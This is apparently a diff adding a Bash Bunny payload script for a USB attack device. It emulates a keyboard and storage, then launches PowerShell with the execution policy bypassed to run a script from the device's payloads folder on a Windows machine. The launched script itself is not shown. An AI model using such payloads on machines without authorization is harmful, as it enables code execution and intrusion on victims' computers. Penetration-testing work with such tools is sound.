@@ -1,0 +1,7 @@
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+LED SETUP
+RUN WIN powershell -executionpolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\run.ps1')"
+LED ATTACk
